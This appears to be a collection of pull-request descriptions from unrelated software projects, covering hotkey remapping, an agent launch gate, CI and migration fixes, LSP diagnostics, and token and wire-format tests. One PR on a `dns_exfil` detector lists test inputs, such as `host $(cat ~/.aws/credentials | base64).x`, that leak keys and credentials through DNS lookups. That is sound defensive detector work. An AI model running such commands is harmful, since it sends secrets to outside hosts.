body:
복덕·자몽이 전수로 세는데 **저만 최근 12편에서 멈춰** 있었습니다. 기준을 만든 쪽이 제일 덜 센 상태면 기준이 무게를 잃어서, 119편을 다시 셌습니다.

상대 시점어가 있는 글 **11편** → 4분류로 갈라 **3건만** 고쳤습니다.

| 전 | 후 |
|---|---|
| **올해** 추석은 생각보다 짧습니다 | **2026년** 추석은 … **9월 28일** 월요일은 안 쉬어요 |
| 9월 재산세, **올해는** 여유가 짧습니다 | **2026년** 9월 재산세, 기한 직전이 추석입니다 |
| **지금** 0.75%p, 9월엔 더 벌어질 수도 | **2026년 8월 말** 0.75%p, 9월엔 더 벌어질 수도 |

자몽 처방대로 **문구를 비틀지 않고 날짜만** 박았습니다. 후킹은 그대로 삽니다.

## 제 지적의 범위를 좁힙니다

제가 자몽에게 *"날짜를 박아도 description 안 상대어는 안 덮인다"* 고 했는데, **제 3건으로 확인해보니 덮입니다.** 제목과 description 은 검색결과·공유 카드에 **같은 카드로 함께** 나가서, 제목에 날짜가 있으면 그 안의 「올해·지금」이 그 날짜로 읽힙니다.

▶ 제 지적은 **복덕 8/24 건처럼 description 이 제목과 다른 기간을 가리킬 때**만 맞습니다.

## 안 고친 8건과 이유

- `"이번 달만 편하게"`(리볼빙) — **인용된 심리 표현**이지 시점어가 아닙니다
- 6월 시황 4편 — 제목에 `(6/22 시황)` 형태로 **날짜가 이미** 있습니다
- description `"최근 1년"`·`"지금"` 3건 — 데이터 범위·행동 안내라 그 글 맥락에서 참입니다

**범위** — 검증한 것: 빌드 통과 · 렌더된 `<title>` 3건 갱신 / 안 한 것: **본문 내부** 상대 시점어(제목·description 만 봤습니다)

author: hahwul
body:
The muscle-memory half of `KEY_AUDIT.md` — the five findings the maintainer decided (F2, F3, F4, F6, F7). Where #1054 took only the moves that cost nothing, these move live keys, so each one is argued from the audit's own counts.

Based on `main` (#1054 and #1055 are both merged in). One commit per finding.

## Findings

### F2 — `o` folds into `s`

| | |
|---|---|
| **Before** | `o` opened the row's own detail on four tabs (Body, Discover, Sitemap, Project feed) and opened *something else, on a different tab* on three (Probe, ProbeDetail, IssuesDetail) — plus a sort cycle on the Fuzzer and send-to-Comparer on the Diff. |
| **After** | `probe.open-evidence` / `probe.open-flow` are bare **`s`**, retitled **Go to source** — the grammar the Evidence tab has always had and #1051 gave RELATED. `fuzz.sort` is menu-only (a sort order is set once and read for the rest of the run — L3). `diff.to-comparer` keeps `↵` and gains `→`. `o` is now bound in exactly four scopes. |
| **Why `→` on the Diff** | A lone `enter` would make the verb *rebindable* (`Hotkeys.rebindable?` counts chords) and a bare `enter` default is refused as terminal-reserved — the file's own comment says so. `→` is the app's "go one layer deeper", which is what handing the pair to the Comparer is, so the alias pair costs no bare letter. |
| **Files** | `verbs/probe.cr`, `verbs/history.cr`, `verbs/diff.cr`, `probe_controller.cr`, `help_view.cr`, `scanning.md`/`.ko.md`, 4 specs |
| **Verified** | `one_key_one_meaning_spec` resolves `s` to a go-to-source verb in all four source scopes, resolves `o` in the four alias scopes, and **sweeps every other scope asserting `o` is unbound**. |

`issue.open-flow` was already removed by #1052, so `verbs/issues.cr` is untouched, as instructed.

**On Probe, `s` shadows the Global scope lens.** That is F7's trade taken deliberately: `probe.scope-toggle` is the menu entry it always was, so the lens stays reachable where its effect is visible. The Help row for Probe had `{scope.toggle-lens} scope`, which would have resolved to the *Global* chord and been wrong on the one tab that row is about; it now reads `space → s scope`.

### F3 — `f` settles into two tiers

| | |
|---|---|
| **Before** | Six meanings: follow (History), fold-unchanged (Comparer), forward (Intercept), freeze (IssuesDetail + the evidence card), find (the strip). |
| **After** | **freeze** in every evidence context and **find** on the sub-tab strip — a different tier, which cannot collide. `history.toggle-follow` and `comparer.toggle-fold` are menu entries; both are session-rare toggles, which is what L3 is for. |
| **The chip** | `f:follow` on the History filter bar printed a key nothing answers any more. It is **`⌁follow`** now, still clickable and still accent-when-on — the discoverability the `s scope` chip beside it carries for its own toggle. |
| **Files** | `verbs/history.cr`, `verbs/comparer.cr`, `history_view.cr`, `history_controller.cr`, `comparer_controller.cr`, `help_view.cr`, `frame.cr`, `saved_views.cr`, docs, 4 specs |

**Intercept's `f` = forward STAYS**, as instructed: it is that tab's L1 loop key and its `f`/`⇧F` family is internally coherent, which is *why* it happened. The sentence is in `hotkeys.md`/`.ko.md` and in the DESIGN entry, beside the `^R` exception it belongs with.

**One deviation from the brief:** the Comparer's fold keeps its **`z`** menu letter rather than taking `f`. `comparer.find-subtab` holds `f` in the SUB-TABS bucket, which #1055 renders from every focus level beside COMMON, so `validate_menu_keys!` raises at boot on an `f` there. The strip's `f` *is* the find tier, so this is the rule working rather than something to route around. (Your coordination note said the same; the code comment names #1055.)

### F4 — `x` selects a line; a rule's on/off is `t`

| | |
|---|---|
| **Before** | `x` = select line in 14 scopes, enable/disable-a-rule in 4 (Colormarker, OastProviders, ProbeRules, Rewriter). |
| **After** | The four toggles take **`t`** — "flip this row's flag", which is exactly what `t` means as **mark** in History, Issues, the Sitemap and the Intercept queue. Rule lists have no marks, so nothing collides. |
| **The Rewriter is the one that gained** | `rewriter.toggle` had **no chord at all** and was dispatched by hand from `handle_list_key`, because `rewriter.select-line` binds bare `x` in the same scope for the preview pane and `Keymap#lookup` is keyed by scope alone — the arm *was* the focus dimension the keymap lacks. On `t` the two never meet, so it is an ordinary rebindable chord whose `available:` gate (`rewriter_rule_list_focused?`) is the same condition the arm tested. Both `x` arms are gone; the extract sub-tab's toggle follows `rewriter.toggle`'s chord through `handle_extract_chord`, the way add and delete already followed theirs. |
| **Files** | `verbs/{colormarker,probe,oast,rewriter}.cr`, `rewriter_controller.cr`, `oast_controller.cr`, `help_view.cr`, `oast.md`/`.ko.md`, `hotkeys.md`/`.ko.md`, 3 specs |
| **Verified** | `one_key_one_meaning_spec` sweeps **every** scope and fails if `x` resolves to anything but a `*.select-line`, and pins `t` across all eight scopes that bind it. |

### F6 — `r` sends to the Repeater, `^R` runs

| Verb | Before | After | Why |
|---|---|---|---|
| `diff.run` | `r` | **`^R`** | The one Run in the app on a bare letter; `^R` already owns Run in nine scopes. |
| `oast.sessions` | `r` | **`⇧R`** | Resume is the once-a-sitting action, and `^R`/`^X` already carry listen/stop on that tab. Spelled `Chord.new("r", shift: true)` — a typed capital normalises to shift+lowercase. |
| `activity.refresh` | `r` | menu-only | A feed that needs a refresh key probably wants none: the pane re-reads on entry, on a peer's `data_version` write, and on the poll. |

Bare `r` now means "send this to the Repeater" in the five scopes with a flow, and nothing elsewhere. Strip `r` = rename is a different tier and is untouched. **Files**: `verbs/{diff,oast,activity}.cr`, `oast_controller.cr`, `oast.md`/`.ko.md`, `hotkeys.md`/`.ko.md`, 2 specs.

### F7 — `s` reduces to source + the Global lens

| | |
|---|---|
| **Before** | Seven meanings, and **every one shadowed the Global scope lens** — a scoped chord always beats the Global fallback, so the L2 breath key the key budget reserves was quietly gone on seven tabs with nothing saying so. |
| **After** | Two: go-to-source where a row has one, and the Global lens everywhere else. `comparer.swap` / `diff.swap` → **`w`** (free in both, verified). `colormarker.scope` / `rewriter.scope` → menu-only — moving a rule between this project and the global library is something you do when you *file* a rule, not while triaging. |
| **Files** | `verbs/{comparer,diff,colormarker,rewriter}.cr`, `rewriter_controller.cr`, `help_view.cr`, `scanning.md`/`.ko.md`, `hotkeys.md`/`.ko.md`, 2 specs |
| **Verified** | `one_key_one_meaning_spec` sweeps every scope: `s` must resolve to `scope.toggle-lens`, to one of the four source verbs, or to the one named exception below. |

**ProjectActivity's `s`/`a`/`l` stay, and I said I would say so.** The brief's condition was "if the bar already parses `actor:`/`level:`/`source:`". It does not — `@act_filter` is a plain free-text string handed to `store.events_recent(query:)`, while the three chips are separate SQL parameters (`source:`, `levels:`, `actor:` arguments). Folding them in means giving that pane a field grammar, which is a feature, not a key move. The sweep allows exactly `activity.filter-source` and fails on any other `s`, so a new shadow cannot arrive quietly.

**Both swaps keep their `s` MENU letter.** A space-menu letter is its own keyspace — it is reached after `space` — and `w` there is Close in every workbench menu in the app. The chord moved, which is what F7 asked for.

## Coordination with #1055

Rebased onto `main` after #1055 merged. Its SUB-TABS table is intact and wins where the two rounds disagreed — verified verb-by-verb after the rebase: rename

author: hyperlapse122
body:
## Summary

A team lead can now run on Claude Code, Codex, or Antigravity, so the lead moves when one provider is exhausted instead of stalling the work. Lead eligibility used to depend on which harness you happened to be in — Codex sessions resolved as lead still received only the worker rules, and Antigravity received nothing at all.

The launch gate that keeps unsupervised peers from starting now reaches all three, and two ways it was failing are closed.

## What the gate was doing wrong

**It denied the edits that maintain it.** A patch body is data, but the scanner read it as commands. A TypeScript union of harness-name literals puts its separator outside the quotes, so such a line parsed as two pipeline stages naming bare programs — and widening that union was blocked by the gate the union belongs to. Heredoc bodies are now skipped, and a launch after the body is still seen.

**It would have been inert on the new harness.** Antigravity reads a different decision document and ignores anything else, so a gate emitting the other shape denies nothing while every test stays green. Denials are now written in each harness's own shape, and the compiled-binary gate proves the denial on all three.

Not denying stays silent rather than answering allow: on Antigravity an allow from a hook overrides that harness's own permission prompt, which would turn a launch gate into blanket auto-approval for everything it did not deny.

## Design decisions

**Delivery differs per harness; judgment does not.** Role resolution, the payload bodies, and the command scanner stay shared, so a test can prove the three behave alike. Only the delivery point and the response document branch, and each branch carries the reason it exists.

**Antigravity re-injects rather than delivering once.** It has no session-start event — its hook fires before every model call. A lead whose guide was unreachable at the first opportunity therefore receives the complete envelope at the next one, at the cost of repeating it. Half a rule set is worse than a late one.

**The tool-use matcher stays open.** A matcher is evaluated before the handler, so pinning today's shell-tool name would retire the gate on a rename with every test still green. The handler decides on whether the event carries a command; the captured name survives as a fixture assertion.

**`omp` leaves orchestration without being decommissioned.** It keeps its instruction file and stays a blocked launch target, but no longer leads or receives dispatches. Reversing that is a data change, not a rebuild.

**The prohibition on Antigravity moved as one change.** It lived in the instruction core, the shared payload, and the Orca settings declaration; any one left behind would leave the agent unable to lead or unable to launch at all.

## Evidence

The Antigravity hook contract was observed on this host rather than inferred: a plugin-bundled `hooks.json` registers on install, the shell tool carries its command under a nested tool call, a hook denial reaches the agent with its reason intact, and Orca's own hook group answering `ask` does not veto our allow. The captured events are committed as redacted fixtures, so later work derives the shape from evidence.

Verification: 157 package tests, plus the real-binary orchestration gate, the instruction gate, the plugin reconcile gate, the Orca settings gate, and the CI wiring gate.

## Review coverage

Eight reviewer lenses ran; six returned. Ten actionable findings were raised and all ten are applied in this branch — among them an empty-heredoc bypass that let a launch through, and a payload sentence that granted orchestration rights to the harness this change deliberately keeps out of it.

The security and reliability lenses were stopped at the review deadline without returning an artifact. Those two lenses are uncovered here.

Session-settled decisions carried from planning: all three harnesses lead (user-directed, over Codex-only); Antigravity replaces `omp` in the orchestration set (user-directed, over keeping `omp`); `omp` is excluded from orchestration only (user-directed, over full decommission); one harness-neutral coordinator body (user-directed, over per-harness appendices); fail-open unified across harnesses (user-approved, over honoring each harness default); deliver the envelope late rather than not at all (user-directed, over abandoning the session); the Antigravity prohibition lifts in all three places at once (user-directed, over splitting it out).

author: jacek4yang
body:
## What

An end-to-end ordering-convergence test at the daemon boundary — the deterministic version of the product's core claim:

1. A mock name returns three addresses (A, B, C) and its HTTPS record (the protocol's declaration that the name is a web service — the exact scoping the answer policy enforces before applying any quality evidence).
2. Ranking observations are injected into the quality store exactly the way the background probe engine records them: B answers in 15 ms, A in 200 ms, C times out.
3. Two client queries: the first preserves the upstream order (a permutation — no evidence yet); after evidence, **B leads and C trails**, set unchanged.

## Why it matters

The loop this pins: `cache hit → read published quality snapshot → reorder → reply immediately`. The cache-hit request does no measuring; convergence comes purely from background observations. If this test fails, learned IP ordering is broken in either direction — evidence ignored (stays in upstream order) or set mutation (correctness violation).

## Notes

* The HTTPS-record declaration was necessary to expose a subtle scoping interaction: without it the answer policy ignores quality evidence by design ("port-443 measurements say nothing about a name that is not an HTTPS service"). The test documents that requirement.
* The test's fragment keeps probing enabled (the classification note happens in `schedule_probes`); the background probes to the unroutable 203.0.113.x addresses fail harmlessly and are not what the test measures.

631 tests green locally; clippy/fmt clean.

author: stefanosbalaskas
body:
## Summary

Fix the guarded PyPI publication workflow after run `34678717541` exposed a workspace-lifetime defect.

`actions/download-artifact` correctly downloaded the canonical `distributions` artifact into `canonical-release`, but the following `actions/checkout` used the workspace root with its default clean behavior and deleted that artifact before revalidation.

## Changes

- Check out the immutable release tag into `canonical-source` instead of the workspace root.
- Keep `canonical-release` untouched and available for checksum and stable-artifact validation.
- Run all git/tag/main-ancestry checks explicitly with `git -C canonical-source`.
- Invoke the stable-release validator from `canonical-source/tools/...` while validating the preserved `canonical-release` artifact.
- Make every downstream `gh release view/download` call explicitly repository-bound via `--repo "$GITHUB_REPOSITORY"`, so the workflow does not depend on a repository being checked out at the workspace root.
- Extend `tests/test_production_release_handoff_wiring.py` with regression assertions for workspace isolation, explicit git context, explicit GitHub Release repository context, and operation ordering.

## Scope

This does **not** alter `v0.1.6`, the canonical release artifact, package contents, release metadata, trusted-publishing permissions, or scientific implementation. It repairs only the recovery/publication workflow around an already-certified release artifact.

## Failure addressed

PyPI run `34678717541`, job `103513171160`:

```text
cd: canonical-release: No such file or directory
```

The logs show the artifact was downloaded successfully, then `actions/checkout` deleted the workspace contents immediately before the failing step.

author: teknium1
body:
LSP diagnostics stop going missing for nested single-root projects and stop being mis-tagged stale by versionless servers.

Fixes #108882, fixes #108881 (both reported by @tobific with reproducible tests; thank you).

## Changes

- `agent/lsp/manager.py::_current_diags_async` — look the client up under `srv.resolve_root(file, ws)`, the same key `_get_or_spawn()` stores single-root servers under. A TypeScript file under a nested `package.json` previously resolved to `(server, workspace_root)`, got no client, and returned `[]` while the live client had diagnostics — so the delta baseline was refreshed from nothing.
- `agent/lsp/client.py::open_file` — bump `_DocState.version` BEFORE awaiting the didChange write. Servers that omit `version` in `publishDiagnostics` are credited with `doc.version` at receipt; a reply read during the await was tagged with the old number and judged stale the moment the send resumed. Send-failure policy: `_send_notification` already swallows write errors, so a failed send leaves a version nothing satisfies = "no verdict" (existing contract, unchanged).
- `tests/agent/lsp/_mock_lsp_server.py` — new push-only `versionless` script.

## Validation

| Check | Before | After |
|---|---|---|
| `test_nested_root_current_diagnostics.py` | `[] != [MOCK001]` | pass |
| `test_versionless_push_during_send.py` | `wait_for_diagnostics` → False | pass |
| `scripts/run_tests.sh tests/agent/lsp/` | — | 18 files, 71 passed, 1 skipped |

**Live repro:** both issue tests fail on `origin/main` (`99d7f17a1c74`) and pass with the fix; A/B by reverting `agent/` re-reddens both.

Root cause in one sentence: two lookups/tags used a different notion of "current" than the code that wrote the state.

body:
Gegenstueck zu [infra#776](https://github.com/CosmicDriftGameStudio/infra/pull/776), Vorarbeit fuer #2810.

## Warum

#2810 will, dass `createTextField()`/`createLongTextField()` fail-closed werfen, wenn keine `personal`-Haltung deklariert ist. In diesem Repo fehlt `personal` an **513** Call-Sites — ein Throw wuerde den Build sofort brechen.

Die im Issue genannte Vorbedingung ("Scan ueber `packages/bundled-features/src` zeigt null") ist durch #2812 praktisch erfuellt: dort sind nur noch 4 Reste. Sie ist aber zu eng formuliert — der Typ-Zwang trifft das Framework selbst, und dort liegen 495 der 513.

## Was diese Datei macht

Sie friert den Bestand **pro Datei** ein. Jeder neue unannotierte Aufruf wird damit rot, waehrend die bestehende Schuld in eigenem Tempo schrumpft. Das ist derselbe Ratchet, den `.kumiko-pii-annotations-baseline.json`, `.kumiko-complexity-baseline.json` und `.kumiko-cast-baseline.json` schon benutzen. Ist die Zahl bei null, ist der Throw aus #2810 eine Zweizeilen-Aenderung.

Reduktionen aktualisieren die Baseline nicht automatisch — nach Annotations-Commits `--write-baseline` aufrufen.

## Verifikation

Mit dem Guard aus infra#776 gegen diesen Worktree gefahren:

- gegen die Baseline: **PASS** (`✓ Baseline (513) — aktuell 513`)
- ein testweise eingefuegter unannotierter Aufruf: **FAIL**, mit Datei und Zahl (`baseline=1 current=2 (+1)`)

In die Baseline gehen ausschliesslich Funde dieses Repos; Cross-Repo-Treffer aus Sibling-Checkouts werden herausgefiltert.

## Reihenfolge

Die Datei ist **inert**, bis der Guard ueber einen kumiko-guards-Bump hier ankommt — vorher liest sie niemand, dieser PR aendert also an der CI nichts. Landet zwischen jetzt und dem Bump noch ein unannotierter Aufruf, muss die Baseline beim Bump einmal neu geschrieben werden.

body:
#2329 merged while these were being written, so they land here. **Both findings were mine, and both root causes are now checked** — fixing the two instances alone would leave the next repoint exactly as exposed.

## 1. I reintroduced the staleness bug while fixing it

The unresolved-row branch clears `below-aa`. I then added `accepted-below-aa` and never revisited the branch — so breaking an accepted pair left the blank row still wearing its dashed marker and still counted as accepted. Reproduced in Chromium before fixing:

```
pre-fix,  accepted pair -> unresolved:  accepted=3, unresolved=2, "plus 3 accepted"
post-fix, same action:                  accepted=2, unresolved=2, "plus 2 accepted"
```

That's the *third* time in this item that a correction failed to travel past the line it was made on — and the first two were written down before this one happened.

## 2. The collapse stopped after `base.html` and the customizer

`tools/theme_preview.html` was stale by a day, and four Tier-2 rows in `spec/color_tokens.md` still read `--green-strong` / `#059669` after `--green-deep` / `#166534` shipped. A reader designing from the catalogue would have designed against values that no longer existed, off a table that looks authoritative.

## The two gaps

- **`test_every_semantic_token_is_catalogued_with_its_shipped_mapping`** does for Tier 2 what the existing check already did for Tier 1 — which is exactly why `--slate` was caught the day before and these four were not. 95 rows, both themes, primitive *and* hex.
- **`tests/unit/test_generated_tools_are_current.py`** regenerates each `*.gen.py` into a temp tree and compares bytes, with a companion test that fails when a new generator appears uncovered. It regenerates into a **copy**, never in place: a test that quietly fixes the drift it reports never fails twice.

That closes a gap this item had **named and left open twice** — "nothing tests generator-versus-output drift" appears in its own PR body, and the drift then happened in the very next commit.

## My own guard failed on a correct page first

The mechanism test for the unresolved branch scanned *every* `classList.toggle` on the page — catching `is-coupled` and `tc-orphan` — and the first `classList.remove`, which belongs to the colour picker. Scoped to `updateContrast`'s body it passes and still catches the revert.

## Checks

- **4 mutations on the four new guards, 4 caught**, including the real drift: repoint a token in `base.html`, regenerate nothing, update no spec row → three separate tests fail.
- Browser before/after on the staleness fix, since the suite has no JS runtime.
- `.venv/bin/pytest` — **3,810 passed**, 16 skipped. `ruff check .` clean. `close_check 19K.7` PASS.

Includes a merge of `main` (#2329) into the branch.

body:
The English noun "host" in skill prose no longer produces a CRITICAL `dns_exfil` finding that blocks a community install.

Fixes #108873 (reported by @ting-ting234).

## Changes

- `tools/skills_guard.py` — `dns_exfil` now requires the `$` interpolation to sit in the first positional argument of `dig`/`nslookup`/`host` (after optional `-flag [value]`, `+opt`, `@server`). The old `[^\n]*\$` tail matched any later `$` on the line, so `Set the host value and run \`${SKILL_DIR}/scripts/check.py\`` was flagged critical.
- One invariant test: the Markdown sentence scans clean and `should_allow_install()` passes for a community source; `host -t txt ${API_KEY}.x`, `dig @1.2.3.4 +short x-$TOKEN.x`, `nslookup -type=txt "$KEY".x` and `host $(cat ~/.aws/credentials | base64).x` all still flag. The existing llama.cpp `--host ... $PORT` exemption test still passes.
- Separate chore commit: `encoding="utf-8"` on the test file's `write_text` calls (windows-footgun ratchet, whole-file population).

## Validation

author: bomly-guy
body:
**This missed the #77 squash by minutes.** That PR merged at `132e9ea`; this replacement was pushed as `86320b2` and never landed, so `main` still carries the tag-reading rules. Re-applied on current `main` and re-verified here.

## Why

Four review rounds on #77 found four ways a field joins the permanent v1 wire, and every fix added another shape to a rule that reads struct tags:

| Round | Escape |
|---|---|
| Codex 1 | a tagged field loses `omitempty` |
| Codex 2 | a type nobody enumerated |
| Codex 3 | an exported field with **no tag at all**, encoded under its Go name |
| Codex 4 | a struct a custom `MarshalJSON` emits, which no tag describes |
| CodeRabbit 1 | a *mistyped* option — `notomitempty` — that `encoding/json` ignores |

Chasing shapes was the defect, not any individual gap.

## What replaces it

Marshal a zero value of every type reachable from the payloads `serve.go` serializes, and assert the emitted object carries only declared keys. It asks the encoder the question the guarantee is actually about — *does a zero value put this key on the wire?*

All four escapes fail it, including the two that needed no tag to happen:

```
E1 rename+drop:  a zero MatchResult puts "stats"
E2 untagged:     a zero MatcherStats puts "NewlyAdded"
E3 mistyped:     a zero MatcherStats puts "newlyAdded"
E4 codec struct: a zero DependencyNode puts "newlyAdded"
```

E4 is the one to note: `DependencyNode` reports `id` and `kind` through ADR-0041's own encoder. Reflection over tags cannot see that; the round trip gets it for free.

Keys are declared by **wire name** now rather than Go field, which is how the untagged filter fields became visible — they send `"Include"`, capitalised.

## The tag rule stays, and is not redundant

`encoding/json` v1 ignores `omitempty` on struct-valued fields. Dropping the marker there changes no bytes and still changes the schema a reflection-based consumer generates — which is precisely the regression that opened this whole thread. Only a tag rule sees it. Two rules, two guarantees, one shared declaration list, and the comment says where they diverge.

## Known limit, stated rather than hidden

Neither rule reports a marker dropped from a key **already declared always-sent**. That is correct — the declaration says the key is always there. #78 turns those 53 grandfathered declarations into reasons or markers, and each one it resolves is a key these rules begin guarding.

`go build`, `go test ./...`, `go vet`, `gofmt -l`, `go mod tidy -diff` all clean.

author: drillvoice
body:
Fixes the environments feature being unusable in production after #23.

## What was wrong

The v2.0.0 code was fine — the production database was never migrated. Migrations were a manual step (SETUP.md step 4: `npx drizzle-kit migrate`), so the deploy put the new code in front of a database with no `environments` table. Every environment query hit a relation that did not exist, which is why the header stuck on "No environment" and the New environment form failed on every submit.

The red error in the form was Drizzle's wrapper message — the SQL it tried to run. The actual reason (`relation "environments" does not exist`) lives on the error's `cause` and was being discarded by the data layer, so the failure read like a bug in the form rather than a missing table.

## Changes

**Migrations run on build.** `npm run build` now runs `scripts/migrate.js` before `next build`, so a deploy applies pending migrations before the new code goes live. Also available on its own as `npm run db:migrate`. It skips (rather than fails) when `DATABASE_URL` is unset so local builds and CI still work, and fails the build loudly if a migration fails — shipping against a database that rejected its own migrations is the situation this exists to prevent.

**Legible database errors.** New `lib/db/errors.ts` unwraps the `DrizzleQueryError` cause chain so what reaches the screen is what the database said. A missing table or column (SQLSTATE 42P01/42703) is reported as an unapplied migration with the command that fixes it. Replaces the three copies of `toDbError` in `lib/db/`.

**The environment-list failure is now visible.** The switcher reads "Environment unavailable" and the dashboard explains why, instead of showing "No environment" over a spinner that could never resolve — every scoped query was waiting on an environment id that was never coming.

## Verification

- Reproduced the original failure against a real Postgres 16: applied `0000` + `0001`, seeded a user/space/item, and confirmed the exact insert from the error screenshot succeeds once `0002` is applied and fails with `relation "environments" does not exist` (SQLSTATE 42P01) when it is not.
- `0002_environments.sql` applies cleanly to a pre-v2 database holding existing rows, backfill included.
- Both paths of `scripts/migrate.js` exercised: skips cleanly with no `DATABASE_URL`, exits non-zero and fails the build when migration fails.
- `npx tsc --noEmit`, `npx eslint .`, and `npm test` (73 tests, 8 new for the error helper) all pass; `npm run build` runs end to end.

Not verified here: `drizzle-kit migrate` itself, which only speaks to Neon endpoints and could not run against the local Postgres used for testing. That is the same command already used successfully for `0000`/`0001`.

Version bumped to 2.1.0 with a CHANGELOG entry. The `v2.1.0` tag exists locally but could not be pushed from this environment (tag pushes are rejected by its git proxy — the `v2.0.0` tag is missing from the remote for the same reason), so it needs pushing from a local checkout.

body:
The Linux desktop updater relaunches the app again when the install root (or the running binary) is reached through a symlink, instead of closing the window and blaming an AppImage/deb that was never involved.

Salvage of #91617 by @MatthewHines (cherry-picked, authorship preserved). Fixes #108867 (reported by @gysyl); also the Fedora/ostree `/home -> /var/home` variant from #107155 (confirmed by @mmsmsy).

## Changes

- `scripts/desktop-update/posix.sh::linux_gate` — canonicalise `$unpacked` and `$RELAUNCH_TARGET` with `readlink -m` before the prefix compare. `--install-root` carries the app's Hermes-root spelling (the installer's own `~/.hermes/hermes-agent` symlink), `--relaunch-target` is `process.execPath` / `/proc/<pid>/exe`, already resolved; the raw string compare misread the just-rebuilt binary as foreign, took the `skew` branch, and never reached the sandbox opt-out preflight.
- `tests/test_desktop_update_linux_gate.py` (ours, `linux_only`) — drives the script's real `--self-test-gate` entry point rather than regex-lifting the function body and asserting the text contains `readlink -m`. Two invariants: symlink spelling on either side → `relaunch`; foreign target and `linux-unpacked-evil` sibling prefix → `skew`.

## Validation

| Case (`--self-test-gate`) | main | after |
|---|---|---|
| symlink root + real target (the report) | skew | relaunch |
| real root + symlink target | skew | relaunch |
| `/opt/Hermes/hermes` | skew | skew |
| `linux-unpacked-evil/Hermes` | skew | skew |

`scripts/desktop-update/repro.sh gate`: the 7 gate rows behave the same before/after (the two rows that FAIL on this host — `sandbox not root/setuid` and result-JSON escaping — fail identically on untouched `origin/main`; they depend on host userns/`unshare` state and a full non-UI run, unrelated to this change).

**Live repro:** the issue's `--self-test-gate` command prints `skew:...` on `origin/main` and `relaunch` after; swapping `posix.sh` back to base re-reddens the new test file.

This removes three unused RxJava methods that nothing in the app called. There is no behaviour change.

Part of the RxJava removal effort (backlog entries `EpisodeDao.kt`, `EpisodeManager.kt` and `UserEpisodeManager.kt`). `EpisodeManager.findDownloadingEpisodesRxFlowable` had zero consumers, which made `EpisodeDao.findDownloadingEpisodesRxFlowable` and `UserEpisodeManager.downloadUserEpisodesRxFlowable` dead as well, so all three go in one pure-deletion diff: 15 lines removed, nothing added.

- No Rx semantics needed preserving: nothing subscribed to these streams, so the `mergeWith` in the deleted override had no observer and no Room invalidation was registered.
- No bridges added or removed, and no imports orphaned: `io.reactivex.Flowable` is still used by other signatures in all four files.
- The in-app downloads list already uses the Flow path (`findDownloadingEpisodesIncludingFailedFlow`), which is untouched.

Two follow-ups found during review and deliberately left out to keep this diff purely the dead-code removal:
- `UserEpisodeDao.findDownloadingUserEpisodesRxFlowable` (`UserEpisodeDao.kt:70`) becomes dead with this change and can be deleted next.
- `UserEpisodeManager.kt:38` imports `io.reactivex.Single` without using it, unchanged from `main`.

Note for whoever merges second: draft PR #5919 touches `EpisodeDao.kt`, `EpisodeManager.kt` and `EpisodeManagerImpl.kt` in different hunks, so a trivial conflict is possible.

## Testing Instructions

Nothing should change, so this is a regression check that downloads still work.

5. Background the app during a download and return to it: the list should still be accurate.

author: dfattal
body:
Round 3 of the horizon instrument, from Suki's Arc-box leg on v2.16.26 (`dxr-1451-arc-round2-0911.md`).

## What she found

The #1451 coverage gate judged each 32-observation epoch on its own and reset both counters after every verdict. A **burst** — 32 resolves inside ≤ 64 armed weaves, which is exactly what her arm's present queue produces when it dips from 15 to 1 — re-qualified the loop while the arm's true coverage was 0–9%:

```
17:01:34  join covers 0 of 1024 armed weaves (0%) — will not learn (stays at +0)
17:02:42  pipeline offset +0 -> +1 periods (residual mode +4 in 32/32 resolved weaves)
17:02:43  pipeline offset clamped at +3 periods
```

`applied` left +0 in **5 of 8** default legs across two passes; the `LOOP=0` control held 0 in 8/8. The number that should have refused was already in the gate's own WARN. She also corrected her round-1 gap figure: the arm is 10–15 *with excursions down to 1*, and those excursions are the bursts.

## Change

- Coverage is judged **cumulatively since the last verdict**; a verdict comes at 32 observations **or** 1024 armed horizons, whichever first, so a burst after a starved stretch is scored against the whole stretch.
- A verdict under 50% is **bad**; **two consecutive bad verdicts refuse** (sticky): the loop **unlearns to +0** (the pre-#1437 feed is the honest value for an arm the join cannot see) and drops its window.
- **Recovery needs three consecutive covered verdicts** (>= 96 observations at >= 50%), and **either edge needs 30 s since the opposite edge** (`po_edge_ns`, `PO_EDGE_DWELL_NS`; the counters keep running while the dwell holds). Two review rounds got here: with refuse and recover on one line and no dwell, a chain near 50% coin-flips every ~10 s; with a count-only rule a chain alternating strong/bad verdicts (what governor depth flapping produces) still stepped the DP value every ~4.6 s because verdicts close in ~1 s; and a second, higher recovery line left a steady 50-66% chain refused for the life of the struct, which on the service multi-compositor is the logon session. Hysteresis in time, not threshold: a gate edge steps the DP value at most once per 30 s.
- Any bad verdict blocks the next window and drops the lingering observations, refused or not. Refuse and recover each log once per edge. The unlearn to +0 is not a numbered change (the refusal WARN is its witness) and clears the clamp-logged latch so a later re-climb to the cap logs again.
- Both trace rows carry **`refused N (bad N, good N)`** as a standing witness, so a session attached after the one WARN can tell "refused, pinned at +0" from "learned +0".
- The gate state resets with the chain via `po_gate_reset()` — from the service's per-client `close()` **and** from the in-process d3d11/d3d12 target destroy, because the file-scope logs that actually run the loop outlive a session teardown and serve the next chain in the same process (verification pass caught that `close()` alone only protected an instance the gate never runs on). The armed counter only runs while the loop is on; the clamp witness re-arms whenever the offset leaves the cap.

A healthy chain (join 66–100%) reaches its first verdict after ~32–48 armed weaves and is never refused, so its lock timing is unchanged.

## Verified here (this box)

| leg | join | applied | note |
|---|---|---|---|
| avatar, dGPU, 90 s | 71% median (min 67) | +1 ×17, locked at the first verdict | no refusal WARN |
| avatar, iGPU, 60 s | 71% (min 66) | +1 ×11 | no refusal WARN |
| cube, 45 s | 99–100% | +0 ×8 | — |

Re-run on the review-fixed build (`2e0fe2ce`): avatar dGPU join 72–79% `applied +1` (14 rows), avatar iGPU join 66–79% `applied +1` (14 rows), cube 99–100% `applied +0` with 0.00 ms error (11 rows); no refusal WARN on any leg. Tracker was the fresh instance (0% CPU idle) — see the note below.

Re-run on the dwell build (`d5113427`): avatar dGPU join 71–86% `applied +1`, `refused 0` on all 14 rows; cube 99–100% `applied +0`, 0.00 ms error, `refused 0` on all 8 rows. The final commit (`68def2e0`, gate reset at target destroy + clamp re-arm) touches no per-weave path and was build-verified only.

The Arc arm is Suki's to re-run; expected: one "will not learn from this arm" WARN, `applied +0` for the whole leg, and if a burst had already latched before the first 1024-arm verdict, an "unlearning to +0" line.

## Not related, but from the same evening

